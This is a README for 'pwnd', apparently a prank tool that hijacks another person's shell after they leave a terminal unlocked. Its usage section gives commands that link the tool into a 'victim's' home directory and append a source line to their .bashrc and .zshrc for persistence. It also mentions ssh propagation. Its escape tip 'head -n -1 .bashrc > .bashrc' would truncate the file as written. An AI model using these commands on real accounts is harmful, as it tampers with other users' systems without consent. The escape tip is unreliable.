# pwnd
You awaken in a confused daze - The last thing you remember doing was walking
away from your unlocked terminal.
You find yourself in a dank cave, with green slime seeping out of every
crevice. As you begin to regain your senses, you hear a shrill whine off in
the distance. You reach for your sudo, but it seems to be gone. You find
a nearby rock, and grip it tightly with one hand as you head off in the
direction of the ominous noise...

# usage
Currently, ssh propagation requires .pwnd be present in the victim's homedir
```
ln -s $HOME/pwnd/.pwnd ~victim/.pwnd
echo "source ~victim/.pwnd" >> ~victim/.{bash,zsh}rc
```
# escape
Currently, the simplest way to escape is simply to reference the binary directly.
```
/usr/bin/vim .bashrc  # Remove offending line
```
Of course, you could always try to be clever:
```
head -n -1 .bashrc > .bashrc
```
This may break in the future if I decide to alter head as well.
